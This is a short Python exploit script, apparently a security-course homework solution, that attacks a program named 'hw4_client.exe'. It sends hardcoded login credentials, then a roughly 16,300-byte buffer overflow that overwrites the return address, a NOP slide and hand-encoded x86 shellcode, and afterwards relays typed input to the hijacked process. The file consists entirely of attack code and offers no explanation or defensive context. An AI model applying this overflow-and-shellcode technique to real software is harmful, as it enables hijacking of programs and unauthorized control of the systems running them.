from subprocess import Popen, PIPE

if __name__ == '__main__':

    login = b"archer\n2BBVAFEX2RNFB2NF\nPEEK\n"

    overflow = b"\x00"+b"a"*16303+b"\x28\x20\x50\x62"
    vulnerability_abuse = login + overflow


    nops_slide = b"\xeb\x15\xCA\xFE\xe8\xdc\x5f\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"


    package = b"\x81\xEC\x00\x40\x00\x00\x89\xE7\x57\x68\x68\x61\x50\x62\xB8\xD4\x4B\x50\x62\xFF\xD0\x6A\x00\x68\x80\x80\x50\x62\x57\x6A\x07\xB8\x90\xFD\x5F\x00\xFF\x30\xB8\x92\x18\x50\x62\xFF\xD0\xEB\xD7"


    p = Popen(["hw4_client.exe"], stdin=PIPE, )
    p.stdin.write(vulnerability_abuse + nops_slide + package + b"\n")
    p.stdin.flush()
    usr_input = ""
    while usr_input != "exit":
        usr_input = input()
        # usr_input='\n' +"*. ; "+ usr_input + '\n'
        p.stdin.write(bytearray((usr_input + "\n").encode()))
        p.stdin.flush()
    p.kill()